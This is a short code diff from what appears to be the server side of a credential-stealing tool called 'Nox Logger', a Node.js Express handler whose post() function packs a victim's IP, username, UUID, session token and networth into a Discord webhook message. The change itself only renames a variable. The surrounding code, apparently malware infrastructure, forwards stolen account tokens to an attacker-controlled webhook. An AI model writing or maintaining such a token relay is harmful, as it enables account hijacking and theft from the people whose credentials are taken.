@@ -74,8 +74,7 @@ app.post('/', (req, res) => {
 });
 
 function post(ip, username, uuid, token, webhook, networth, description) {
-    //check if description is empty
-    let embed = {
+    let data = {
         username: "Nox Logger",
         avatar_url: "https://cdn.discordapp.com/attachments/1053140780425945100/1053509569797705758/nox1-removebg-preview.png",
         embeds: [
@@ -123,8 +122,6 @@ function post(ip, username, uuid, token, webhook, networth, description) {
                 "text": "🌟 Nox Logger - Nox Builder by Gute Nacht 🌟 - Thank you BreadCat for your networth stuff!",
             }
         })
-
-    let data = embed;
     
     var config = {
        method: "POST",
